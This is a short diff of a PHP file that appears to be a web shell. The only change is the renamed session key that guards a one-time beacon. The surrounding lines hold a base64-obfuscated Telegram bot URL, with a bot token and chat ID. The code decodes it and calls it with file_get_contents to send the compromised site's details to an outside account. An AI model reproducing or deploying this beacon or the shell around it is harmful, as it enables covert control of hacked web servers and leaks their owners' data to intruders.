@@ -272,7 +272,7 @@ set_time_limit(0);
 $web = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'];
 $disfunc = @ini_get("disable_functions");
 session_start();
-if (!isset($_SESSION['done_create'])) {
+if (!isset($_SESSION['CREATE FILE'])) {
     $CreateFiles = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc4MjczNTQ5MjI6QUFITlJDaERwY05vMktUeHpfTWVfaF9semdNNWQ3QU
 	VWb1kvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xOTI5ODY4NzIwJnRleHQ9";
     $done = base64_decode($CreateFiles);
@@ -283,7 +283,7 @@ if (!isset($_SESSION['done_create'])) {
     $text = urlencode($file_crt);
     $send_url = $done . $text;
     file_get_contents($send_url);
-    $_SESSION['done_create'] = 1;}
+    $_SESSION['CREATE FILE'] = 1;}
 if (empty($disfunc)) {
     $disf = "<font color='lime'>AMAN</font>";
 } else {
